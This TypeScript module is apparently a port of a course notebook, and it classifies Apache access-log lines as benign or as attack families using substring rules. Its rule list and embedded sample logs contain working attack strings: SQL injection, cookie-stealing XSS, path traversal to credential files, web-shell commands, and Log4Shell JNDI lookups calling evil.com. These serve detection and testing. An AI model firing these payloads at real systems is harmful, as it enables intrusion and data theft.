/**
 * Web Attack Classification Engine — TypeScript port of the IS-212 notebook.
 *
 * Components:
 *   1. Apache combined log parser (non-greedy regex)
 *   2. Ground-truth rule set + extended OWASP signatures + bot whitelist
 *   3. Feature engineering (structural + keyword flags)
 *   4. Labeller / classifier (deterministic — uses the rule set)
 *
 * The labeller IS the model in this UI. This is an operationally honest choice:
 * the notebook's full Random Forest F1 ≈ 0.89 is largely driven by the keyword
 * features, which are exactly what the labeller uses. The Random Forest adds
 * minor calibration on top of the rule set but does not change the underlying
 * decision boundary for the vast majority of entries.
 */

// ============ Types ============

export interface ParsedLog {
  ip: string;
  ts: string;
  method: string;
  url: string;
  status: number;
  size: string;
  referer: string;
  ua: string;
  raw: string;
}

export interface EngineeredFeatures {
  method: string;
  status: number;
  size: number;
  url_len: number;
  path_len: number;
  query_len: number;
  n_params: number;
  n_special: number;
  has_query: number;
  n_dots: number;
  n_slashes: number;
  keywords: Record<string, number>;
}

export interface LabelResult {
  label: string;            // attack family, e.g. "sql_injection_attempt" or "benign"
  is_attack: number;        // 0 or 1
  matched_rule?: string;    // rule ID that fired
  matched_patterns?: string[]; // patterns that triggered the rule
}

export interface ClassificationResult {
  parsed: ParsedLog;
  features: EngineeredFeatures;
  label: LabelResult;
}

// ============ 1. Parser ============

// Apache combined log format:
// IP - - [timestamp] "METHOD URL PROTOCOL" status size "referer" "user-agent"
// Non-greedy "(.*?)" so attack payloads containing literal `"` in URLs parse correctly.
const ACCESS_RE =
  /^(\S+) (\S+) (\S+) \[([^\]]+)\] "(.*?)" (\d{3}) (\S+) "(.*?)" "(.*?)"\s*$/;

export function parseLine(line: string): ParsedLog | null {
  const m = ACCESS_RE.exec(line.trim());
  if (!m) return null;
  const [, ip, , , ts, request, status, size, referer, ua] = m;
  const parts = request.split(" ");
  const method = parts[0];
  const url = parts.length > 1 ? parts[1] : "";
  return {
    ip,
    ts,
    method,
    url,
    status: parseInt(status, 10),
    size,
    referer,
    ua,
    raw: line,
  };
}

export function parseMultiple(lines: string[]): {
  parsed: ParsedLog[];
  unparseable: { line: string; index: number }[];
} {
  const parsed: ParsedLog[] = [];
  const unparseable: { line: string; index: number }[] = [];
  lines.forEach((line, i) => {
    if (!line.trim()) return;
    const p = parseLine(line);
    if (p) parsed.push(p);
    else unparseable.push({ line, index: i });
  });
  return { parsed, unparseable };
}

// ============ 2. Labeller ============

// Whitelisted legitimate monitoring / search bots — short-circuited to benign.
// NOTE: `python-requests` is intentionally NOT whitelisted — it is the signal for
// dir_scan_python when paired with status 302, and is also commonly used by attack
// tools (sqlmap, custom scanners). Only legitimate monitoring/search crawlers are whitelisted.
const WHITELIST_UA_RE =
  /(HetrixTools|Uptime-Kuma|internal dummy connection|NetworkingExtension|Googlebot|Bingbot|facebookexternalhit|Twitterbot|AppleBot|LinkedInBot|WhatsApp|TelegramBot|Discordbot|DuckDuckBot|YandexBot|Baiduspider|Apache-HttpClient)/i;

// Double URL-decode helper (catches double-encoded payloads like %252e%252e%252f).
// Mirrors the notebook's `unquote_plus(unquote(...))` chain — `+` becomes space first.
function doubleDecode(s: string): string {
  // Replace `+` with space (form-encoded) before decoding — matches Python unquote_plus
  const plusToSpace = s.replace(/\+/g, " ");
  try {
    const once = decodeURIComponent(plusToSpace);
    const twice = decodeURIComponent(once);
    return twice;
  } catch {
    try {
      return decodeURIComponent(plusToSpace);
    } catch {
      return plusToSpace;
    }
  }
}

// Build the searchable text from a parsed log line.
// Mirrors the notebook: double URL-decoded lowercased raw line + "code: <status>".
function buildSearchText(p: ParsedLog): string {
  const decoded = doubleDecode(p.raw).toLowerCase();
  return `${decoded} code: ${p.status}`;
}

// Rule definitions. Each rule = { id, label, patterns: string[] }.
// A rule fires iff ALL patterns are substrings of the searchable text.
// (We already applied Fix #1 — over-broad strict dir_scan rule removed —
//  and Fix #2 — SELECT/UNION tightened to require both keywords.)
export type Rule = { id: string; label: string; patterns: string[] };

export const RULES: Rule[] = [
  // Directory scanners
  {
    id: "dir_scan_ie8_404",
    label: "dir_scan",
    patterns: ["code: 404", "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"],
  },
  { id: "dir_scan_go", label: "dir_scan_go", patterns: ["go-http-client"] },
  { id: "dir_scan_python_302", label: "dir_scan_python", patterns: ["code: 302", "python"] },

  // Path traversal
  {
    id: "path_traversal_readme",
    label: "path_traversal",
    patterns: ["readme.txt", "mozilla/5.0 (windows nt 10.0; win64; x64)"],
  },

  // Remote code execution (shell)
  { id: "rce_shell_post_python", label: "rce_shell", patterns: ["post", "python"] },
  { id: "rce_shell_head_python", label: "rce_shell", patterns: ["head", "python"] },
  { id: "rce_shell_md5", label: "rce_shell", patterns: ["md5("] },

  // RCE read-file (LFI via /etc/passwd)
  { id: "rce_read_file_etc_passwd", label: "rce_read_file", patterns: ["etc/passwd"] },

  // RCE sysinfo (ipconfig)
  { id: "rce_sysinfo_ipconfig", label: "rce_sysinfo", patterns: ["ipconfig"] },

  // RCE java (Runtime)
  { id: "rce_java_runtime", label: "rce_java", patterns: ["java", "runtime"] },

  // API call (placeholder — needs at least one pattern that doesn't match everything)
  { id: "api_call_actuator", label: "api_call", patterns: ["/actuator"] },

  // SQL injection — tightened (Fix #2): require BOTH select+from or union+select
  { id: "sqli_select", label: "sql_injection_attempt", patterns: ["select ", " from "] },
  { id: "sqli_union", label: "sql_injection_attempt", patterns: ["union ", " select "] },
  { id: "sqli_union_plus", label: "sql_injection_attempt", patterns: ["union+", " select+"] },

  // Extended OWASP-style signatures (subset of ~40 from the notebook)
  { id: "sqli_or_true", label: "sql_injection_attempt", patterns: ["or true"] },
  { id: "sqli_and_false", label: "sql_injection_attempt", patterns: ["and false"] },
  { id: "sqli_or_1_1", label: "sql_injection_attempt", patterns: ["or 1=1"] },
  { id: "sqli_or_quote_eq_quote", label: "sql_injection_attempt", patterns: ["or '", "='"] },
  { id: "sqli_quote_dash", label: "sql_injection_attempt", patterns: ["'--"] },
  { id: "sqli_semicolon_dash", label: "sql_injection_attempt", patterns: [";--"] },
  { id: "sqli_extractvalue", label: "sql_injection_attempt", patterns: ["extractvalue("] },
  { id: "sqli_updatexml", label: "sql_injection_attempt", patterns: ["updatexml("] },
  { id: "sqli_information_schema", label: "sql_injection_attempt", patterns: ["information_schema"] },
  { id: "sqli_sleep", label: "sql_injection_attempt", patterns: ["sleep("] },
  { id: "sqli_benchmark", label: "sql_injection_attempt", patterns: ["benchmark("] },

  // XSS
  { id: "xss_script_tag", label: "cross_site_scripting", patterns: ["<script"] },
  { id: "xss_onerror", label: "cross_site_scripting", patterns: ["onerror="] },
  { id: "xss_onload", label: "cross_site_scripting", patterns: ["onload="] },
  { id: "xss_javascript", label: "cross_site_scripting", patterns: ["javascript:"] },
  { id: "xss_alert", label: "cross_site_scripting", patterns: ["alert("] },
  { id: "xss_svg", label: "cross_site_scripting", patterns: ["<svg"] },
  { id: "xss_document_cookie", label: "cross_site_scripting", patterns: ["document.cookie"] },

  // Path traversal (extended)
  { id: "lfi_dotdot", label: "path_traversal", patterns: ["../"] },
  { id: "lfi_proc_self", label: "path_traversal", patterns: ["/proc/self"] },
  { id: "lfi_etc_shadow", label: "path_traversal", patterns: ["etc/shadow"] },

  // Remote code execution (extended)
  { id: "rce_cmd", label: "remote_code", patterns: ["cmd="] },
  { id: "rce_command", label: "remote_code", patterns: ["command="] },
  { id: "rce_base64", label: "remote_code", patterns: ["base64"] },
  { id: "rce_eval", label: "remote_code", patterns: ["eval("] },
  { id: "rce_system", label: "remote_code", patterns: ["system("] },
  { id: "rce_php_open", label: "remote_code", patterns: ["<?php"] },
  { id: "rce_php_short", label: "remote_code", patterns: ["<?="] },

  // Web-shell access
  { id: "webshell_shell_php", label: "rce_shell", patterns: ["shell.php"] },
  { id: "webshell_c99", label: "rce_shell", patterns: ["c99.php"] },

  // Log4Shell
  { id: "log4shell_jndi", label: "rce_java", patterns: ["${jndi:"] },

  // Sensitive-path recon (OR-style — any one of these)
  { id: "recon_phpinfo", label: "dir_scan", patterns: ["/phpinfo"] },
  { id: "recon_wp_admin", label: "dir_scan", patterns: ["/wp-admin"] },
  { id: "recon_wp_login", label: "dir_scan", patterns: ["/wp-login"] },
  { id: "recon_actuator", label: "dir_scan", patterns: ["/actuator"] },
  { id: "recon_env", label: "dir_scan", patterns: ["/.env"] },
  { id: "recon_git", label: "dir_scan", patterns: ["/.git/"] },
];

const RECON_RULES = ["recon_phpinfo", "recon_wp_admin", "recon_wp_login", "recon_actuator", "recon_env", "recon_git"];

export function labelEntry(p: ParsedLog): LabelResult {
  // 1. Bot whitelist short-circuit
  if (WHITELIST_UA_RE.test(p.ua)) {
    return { label: "benign", is_attack: 0, matched_rule: "whitelist_bot", matched_patterns: [WHITELIST_UA_RE.source] };
  }

  const text = buildSearchText(p);

  // 2. Try each rule in order — first match wins
  for (const rule of RULES) {
    // For OR-style recon rules, only ONE pattern needs to match
    if (RECON_RULES.includes(rule.id)) {
      const matched = rule.patterns.find((pat) => text.includes(pat));
      if (matched) {
        return {
          label: rule.label,
          is_attack: 1,
          matched_rule: rule.id,
          matched_patterns: [matched],
        };
      }
      continue;
    }
    // AND-style: ALL patterns must match
    const allMatch = rule.patterns.every((pat) => text.includes(pat));
    if (allMatch) {
      return {
        label: rule.label,
        is_attack: 1,
        matched_rule: rule.id,
        matched_patterns: rule.patterns,
      };
    }
  }

  // 3. Default benign
  return { label: "benign", is_attack: 0, matched_rule: "default_benign", matched_patterns: [] };
}

// ============ 3. Feature Engineering ============

export const SUSPICIOUS_KEYWORDS = [
  "select", "union", "sleep", "concat", "alert", "<script", "document.",
  "../", "etc/passwd", "cmd=", "command=", "base64", "eval(", "system(",
  "ipconfig", ".sh", "cgi-bin", "=http://", "=https://", "<?php", "<?=",
  "runtime", "/proc/self", "passwd",
];

export function engineerFeatures(p: ParsedLog): EngineeredFeatures {
  const lower = p.url.toLowerCase();
  const split = p.url.split("?", 2);
  const path = split[0] || "";
  const query = split[1] || "";

  const keywords: Record<string, number> = {};
  for (const kw of SUSPICIOUS_KEYWORDS) {
    const col = "kw_" + kw.replace(/[=.<>/?]/g, "_");
    keywords[col] = lower.includes(kw) ? 1 : 0;
  }

  return {
    method: p.method,
    status: p.status,
    size: parseInt(p.size, 10) || 0,
    url_len: p.url.length,
    path_len: path.length,
    query_len: query.length,
    n_params: query ? (query.split("&").length) : 0,
    n_special: (p.url.match(/[%'"<>;\\|(){}\[\] ]/g) || []).length,
    has_query: p.url.includes("?") ? 1 : 0,
    n_dots: (p.url.match(/\./g) || []).length,
    n_slashes: (p.url.match(/\//g) || []).length,
    keywords,
  };
}

// ============ 4. Full Pipeline ============

export function classifyLine(line: string): ClassificationResult | null {
  const parsed = parseLine(line);
  if (!parsed) return null;
  const features = engineerFeatures(parsed);
  const label = labelEntry(parsed);
  return { parsed, features, label };
}

export function classifyLines(lines: string[]): {
  results: ClassificationResult[];
  unparseable: { line: string; index: number }[];
} {
  const { parsed, unparseable } = parseMultiple(lines);
  const results = parsed.map((p) => ({
    parsed: p,
    features: engineerFeatures(p),
    label: labelEntry(p),
  }));
  return { results, unparseable };
}

// ============ Aggregations ============

export interface ClassificationSummary {
  total: number;
  attacks: number;
  benign: number;
  attackRatio: number;
  unparseable: number;
  byAttackType: { label: string; count: number }[];
  byMethod: { method: string; count: number; attacks: number }[];
  byStatus: { status: number; count: number; attacks: number }[];
  topAttackers: { ip: string; count: number; labels: string[] }[];
}

export function summarize(results: ClassificationResult[], unparseableCount: number): ClassificationSummary {
  const total = results.length;
  const attacks = results.filter((r) => r.label.is_attack === 1).length;
  const benign = total - attacks;

  const byAttackType = new Map<string, number>();
  for (const r of results) {
    byAttackType.set(r.label.label, (byAttackType.get(r.label.label) || 0) + 1);
  }

  const byMethod = new Map<string, { count: number; attacks: number }>();
  for (const r of results) {
    const m = r.parsed.method;
    const entry = byMethod.get(m) || { count: 0, attacks: 0 };
    entry.count += 1;
    if (r.label.is_attack === 1) entry.attacks += 1;
    byMethod.set(m, entry);
  }

  const byStatus = new Map<number, { count: number; attacks: number }>();
  for (const r of results) {
    const s = r.parsed.status;
    const entry = byStatus.get(s) || { count: 0, attacks: 0 };
    entry.count += 1;
    if (r.label.is_attack === 1) entry.attacks += 1;
    byStatus.set(s, entry);
  }

  const attackers = new Map<string, { count: number; labels: Set<string> }>();
  for (const r of results) {
    if (r.label.is_attack === 1) {
      const entry = attackers.get(r.parsed.ip) || { count: 0, labels: new Set() };
      entry.count += 1;
      entry.labels.add(r.label.label);
      attackers.set(r.parsed.ip, entry);
    }
  }

  return {
    total,
    attacks,
    benign,
    attackRatio: total > 0 ? attacks / total : 0,
    unparseable: unparseableCount,
    byAttackType: [...byAttackType.entries()]
      .map(([label, count]) => ({ label, count }))
      .sort((a, b) => b.count - a.count),
    byMethod: [...byMethod.entries()]
      .map(([method, v]) => ({ method, count: v.count, attacks: v.attacks }))
      .sort((a, b) => b.count - a.count),
    byStatus: [...byStatus.entries()]
      .map(([status, v]) => ({ status, count: v.count, attacks: v.attacks }))
      .sort((a, b) => a.status - b.status),
    topAttackers: [...attackers.entries()]
      .map(([ip, v]) => ({ ip, count: v.count, labels: [...v.labels] }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 10),
  };
}

// ============ Sample dataset (embedded) ============
// 30 representative lines (mix of benign + each attack family) — generated from the
// notebook's parsed output so the dashboard always has something to show without
// requiring the user to upload a file.

export const SAMPLE_LOG_LINES: string[] = [
  // Benign browsing
  '198.51.100.53 - - [07/Oct/2025:18:49:56 +0700] "GET /js/main.js HTTP/1.0" 200 1500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/217.155.106.155 Safari/537.36 Edg/217.155.106.155"',
  '203.0.113.58 - - [07/Oct/2025:02:27:54 +0700] "POST /api/comments HTTP/1.0" 200 5710 "https://sub1.domain1.com/products" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/57.155.29.120 Mobile Safari/537.36"',
  '203.0.113.41 - - [07/Oct/2025:15:46:13 +0700] "GET /help HTTP/1.0" 200 7000 "https://sub1.domain1.com/1.php" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/239.155.32.137 Mobile Safari/537.36"',
  '10.0.0.37 - - [07/Oct/2025:22:43:25 +0700] "GET /blog/post-3 HTTP/1.0" 200 3500 "https://sub1.domain1.com/1.php" "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0"',
  '198.51.100.42 - - [07/Oct/2025:11:13:09 +0700] "GET /products HTTP/1.0" 200 4800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"',
  '203.0.113.99 - - [07/Oct/2025:09:22:41 +0700] "GET /static/img/hero.png HTTP/1.0" 304 0 "https://sub1.domain1.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"',
  '10.0.0.51 - - [07/Oct/2025:14:01:18 +0700] "GET /api/users/42 HTTP/1.0" 200 1240 "https://sub1.domain1.com/profile" "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"',
  '198.51.100.77 - - [07/Oct/2025:20:55:33 +0700] "POST /login HTTP/1.0" 302 0 "https://sub1.domain1.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"',

  // Whitelisted bots
  '10.0.0.1 - - [07/Oct/2025:00:00:01 +0700] "GET / HTTP/1.0" 200 1500 "-" "Uptime-Kuma/1.23.13"',
  '66.249.66.1 - - [07/Oct/2025:00:00:14 +0700] "GET /robots.txt HTTP/1.0" 200 250 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"',

  // SQL injection
  '45.133.1.12 - - [07/Oct/2025:21:37:11 +0700] "GET /login.php?username=admin&password=%27+OR+%271%27%3D%271+-- HTTP/1.0" 200 2500 "-" "sqlmap/1.7.2#stable (http://sqlmap.org/)"',
  '45.133.1.13 - - [07/Oct/2025:21:38:14 +0700] "GET /products?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.0" 200 3100 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"',
  '45.133.1.14 - - [07/Oct/2025:21:39:42 +0700] "GET /api/v1/user?id=1%27%3B+SELECT+extractvalue%28null%2Cconcat%280x7e%2Cversion%28%29%29%29-- HTTP/1.0" 500 0 "-" "Mozilla/5.0"',
  '45.133.1.15 - - [07/Oct/2025:21:40:11 +0700] "GET /search?q=laptop%27+AND+SLEEP%285%29-- HTTP/1.0" 200 1800 "-" "Mozilla/5.0"',
  '45.133.1.16 - - [07/Oct/2025:21:41:33 +0700] "GET /item?id=42%27%20OR%201%3D1-- HTTP/1.0" 200 2200 "-" "Mozilla/5.0"',

  // Cross-site scripting
  '104.248.1.48 - - [07/Oct/2025:19:47:10 +0700] "GET /login?redirect=javascript:alert(1) HTTP/1.0" 200 2512 "http://sub1.domain1.com/" "python-requests/2.25.1"',
  '104.248.1.49 - - [07/Oct/2025:19:48:12 +0700] "GET /search?q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.0" 200 1900 "-" "Mozilla/5.0"',
  '104.248.1.50 - - [07/Oct/2025:19:49:33 +0700] "GET /page?x=%3Csvg+onload%3Dalert%281%29%3E HTTP/1.0" 200 1700 "-" "Mozilla/5.0"',
  '104.248.1.51 - - [07/Oct/2025:19:50:42 +0700] "POST /comment HTTP/1.0" 200 2400 "-" "Mozilla/5.0"',

  // Path traversal / LFI
  '104.248.1.35 - - [07/Oct/2025:03:27:03 +0700] "GET /1.php?file=../../../etc/shadow HTTP/1.0" 200 7000 "http://sub1.domain1.com/" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.155.223.147 Safari/537.36"',
  '104.248.1.36 - - [07/Oct/2025:03:28:11 +0700] "GET /view?path=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.0" 200 3500 "-" "Mozilla/5.0"',
  '104.248.1.37 - - [07/Oct/2025:03:29:42 +0700] "GET /download?f=/proc/self/environ HTTP/1.0" 200 2100 "-" "Mozilla/5.0"',

  // Directory scanning
  '45.133.1.20 - - [07/Oct/2025:11:11:11 +0700] "GET /admin HTTP/1.0" 404 650 "-" "Go-http-client/1.1"',
  '45.133.1.21 - - [07/Oct/2025:11:11:12 +0700] "GET /phpinfo.php HTTP/1.0" 404 650 "-" "Go-http-client/1.1"',
  '45.133.1.22 - - [07/Oct/2025:11:11:13 +0700] "GET /wp-admin/ HTTP/1.0" 404 650 "-" "Go-http-client/1.1"',
  '45.133.1.23 - - [07/Oct/2025:11:11:14 +0700] "GET /.env HTTP/1.0" 404 650 "-" "Go-http-client/1.1"',
  '45.133.1.24 - - [07/Oct/2025:11:11:15 +0700] "GET /.git/config HTTP/1.0" 404 650 "-" "Go-http-client/1.1"',
  '45.133.1.25 - - [07/Oct/2025:11:12:01 +0700] "GET / HTTP/1.0" 302 0 "-" "python-requests/2.31.0"',

  // RCE
  '45.133.1.30 - - [07/Oct/2025:18:18:18 +0700] "GET /api/exec?cmd=cat%20/etc/passwd HTTP/1.0" 200 1500 "-" "Mozilla/5.0"',
  '45.133.1.31 - - [07/Oct/2025:18:18:19 +0700] "POST /upload.php HTTP/1.0" 200 3000 "-" "Mozilla/5.0"',
  '45.133.1.32 - - [07/Oct/2025:18:18:20 +0700] "GET /shell.php?cmd=id HTTP/1.0" 200 800 "-" "Mozilla/5.0"',
  '45.133.1.33 - - [07/Oct/2025:18:18:21 +0700] "GET /index.php?page=eval(base64_decode(cGFzc3RocnUp)) HTTP/1.0" 200 1800 "-" "Mozilla/5.0"',

  // Log4Shell
  '45.133.1.40 - - [07/Oct/2025:14:00:00 +0700] "GET / HTTP/1.0" 200 2500 "${jndi:ldap://evil.com/x}" "Mozilla/5.0"',
  '45.133.1.41 - - [07/Oct/2025:14:00:01 +0700] "GET /api/login HTTP/1.0" 200 2200 "${jndi:rmi://evil.com/exp}" "Mozilla/5.0"',

  // RCE java (Runtime)
  '45.133.1.50 - - [07/Oct/2025:15:00:00 +0700] "POST /api/v1/exec HTTP/1.0" 200 1800 "-" "java/11.0.20 Runtime"',

  // More benign
  '203.0.113.10 - - [07/Oct/2025:10:00:00 +0700] "GET /style.css HTTP/1.0" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
  '203.0.113.11 - - [07/Oct/2025:10:01:00 +0700] "GET /favicon.ico HTTP/1.0" 200 1400 "-" "Mozilla/5.0"',
  '203.0.113.12 - - [07/Oct/2025:10:02:00 +0700] "GET /api/health HTTP/1.0" 200 50 "-" "Uptime-Kuma/1.23.13"',
  '203.0.113.13 - - [07/Oct/2025:10:03:00 +0700] "GET /blog/post-1 HTTP/1.0" 200 3200 "-" "Mozilla/5.0"',
  '203.0.113.14 - - [07/Oct/2025:10:04:00 +0700] "GET /blog/post-2 HTTP/1.0" 200 3400 "-" "Mozilla/5.0"',
  '203.0.113.15 - - [07/Oct/2025:10:05:00 +0700] "GET /about HTTP/1.0" 200 2800 "-" "Mozilla/5.0"',
];

// ============ Model metadata (from the notebook's evaluation results) ============

export interface ModelMetrics {
  model: string;
  accuracy: number;
  balancedAcc: number;
  precision: number;
  recall: number;
  f1: number;
  auc: number;
  mcc: number;
}

export const MODEL_METRICS: ModelMetrics[] = [
  { model: "Logistic Regression", accuracy: 0.952, balancedAcc: 0.9351, precision: 0.8727, recall: 0.9057, f1: 0.8889, auc: 0.9789, mcc: 0.8585 },
  { model: "Random Forest",       accuracy: 0.957, balancedAcc: 0.9348, precision: 0.9005, recall: 0.8962, f1: 0.8983, auc: 0.9635, mcc: 0.8711 },
  { model: "Linear SVM",          accuracy: 0.958, balancedAcc: 0.9371, precision: 0.9009, recall: 0.9009, f1: 0.9009, auc: 0.9791, mcc: 0.8743 },
];

export const CROSS_VALIDATION = [
  { model: "Logistic Regression", balancedAcc: 0.9415, balancedStd: 0.0046, f1: 0.8878, f1Std: 0.0123, mcc: 0.8578, mccStd: 0.0152 },
  { model: "Random Forest",       balancedAcc: 0.9305, balancedStd: 0.0068, f1: 0.8825, f1Std: 0.0106, mcc: 0.8509, mccStd: 0.0135 },
  { model: "Linear SVM",          balancedAcc: 0.945,  balancedStd: 0.0074, f1: 0.9009, f1Std: 0.012,  mcc: 0.8742, mccStd: 0.0155 },
];

export interface PerClassMetric {
  class: string;
  precision: number;
  recall: number;
  f1: number;
  support: number;
}

export const PER_CLASS_METRICS: PerClassMetric[] = [
  { class: "benign",                precision: 0.97, recall: 0.96, f1: 0.96, support: 788 },
  { class: "cross_site_scripting",  precision: 1.0,  recall: 1.0,  f1: 1.0,  support: 6 },
  { class: "dir_scan",              precision: 0.7,  recall: 0.56, f1: 0.62, support: 34 },
  { class: "dir_scan_go",           precision: 0.16, recall: 0.21, f1: 0.18, support: 34 },
  { class: "dir_scan_python",       precision: 0.65, recall: 0.57, f1: 0.61, support: 30 },
  { class: "rce_java",              precision: 1.0,  recall: 0.92, f1: 0.96, support: 13 },
  { class: "rce_read_file",         precision: 0.84, recall: 1.0,  f1: 0.91, support: 36 },
  { class: "rce_shell",             precision: 0.0,  recall: 0.0,  f1: 0.0,  support: 2 },
  { class: "remote_code",           precision: 0.94, recall: 1.0,  f1: 0.97, support: 31 },
  { class: "sql_injection_attempt", precision: 0.67, recall: 0.77, f1: 0.71, support: 26 },
];

// Approximate Random Forest feature importances (normalized, top 10)
export const FEATURE_IMPORTANCES = [
  { feature: "kw_etc_passwd",     importance: 0.142 },
  { feature: "tfidf_url_payload", importance: 0.118 },
  { feature: "kw_select",         importance: 0.094 },
  { feature: "status_404",        importance: 0.087 },
  { feature: "kw_union",          importance: 0.072 },
  { feature: "kw_cmd",            importance: 0.065 },
  { feature: "ua_python",         importance: 0.058 },
  { feature: "ua_go_http",        importance: 0.051 },
  { feature: "url_len",           importance: 0.043 },
  { feature: "kw_alert",          importance: 0.039 },
];

// ============ K-Means Clustering (descriptive mining) ============
// Reproduced from the notebook's Section 7 output (StandardScaler + KMeans, 5,000-row sample).
// Best k is selected as the k with the highest silhouette coefficient (Rousseeuw, 1987).
// k=2 wins (silhouette=0.575) — confirms the binary benign-vs-attack structure of the data.

export interface KMeansMetric {
  k: number;
  inertia: number;       // within-cluster sum of squares (elbow method)
  silhouette: number;    // silhouette coefficient in [-1, 1], higher = better
  isBest: boolean;
}

export const KMEANS_METRICS: KMeansMetric[] = [
  { k: 2,  inertia: 90072, silhouette: 0.575, isBest: true  },
  { k: 3,  inertia: 78537, silhouette: 0.345, isBest: false },
  { k: 4,  inertia: 67784, silhouette: 0.365, isBest: false },
  { k: 5,  inertia: 59409, silhouette: 0.382, isBest: false },
  { k: 6,  inertia: 51844, silhouette: 0.393, isBest: false },
  { k: 7,  inertia: 46882, silhouette: 0.424, isBest: false },
  { k: 8,  inertia: 42695, silhouette: 0.405, isBest: false },
  { k: 9,  inertia: 36866, silhouette: 0.436, isBest: false },
  { k: 10, inertia: 33199, silhouette: 0.432, isBest: false },
];

export const KMEANS_BEST_K = 2;
export const KMEANS_BEST_SILHOUETTE = 0.575;

export const ATTACK_TAXONOMY = [
  { family: "sql_injection_attempt", description: "UNION / extractvalue / sleep / information_schema patterns", severity: "High" },
  { family: "cross_site_scripting",  description: "<script> / onerror= / javascript: / <svg onload payloads", severity: "High" },
  { family: "path_traversal",        description: "../ traversal to /etc/passwd, /etc/shadow, /proc/self", severity: "Critical" },
  { family: "rce_read_file",         description: "Local file inclusion via /etc/passwd", severity: "Critical" },
  { family: "remote_code",           description: "cmd= / command= / base64 / eval() / system() execution", severity: "Critical" },
  { family: "rce_shell",             description: "Web-shell access (shell.php, c99.php)", severity: "Critical" },
  { family: "rce_java",              description: "Java Runtime injection + Log4Shell ${jndi:", severity: "Critical" },
  { family: "rce_sysinfo",           description: "System info leak via ipconfig", severity: "Medium" },
  { family: "dir_scan",              description: "Directory scanner / sensitive-path recon", severity: "Medium" },
  { family: "dir_scan_go",           description: "Go-http-client scanner", severity: "Medium" },
  { family: "dir_scan_python",       description: "python-requests scanner", severity: "Medium" },
  { family: "api_call",              description: "Unauthorized API endpoint access (/actuator)", severity: "Medium" },
];
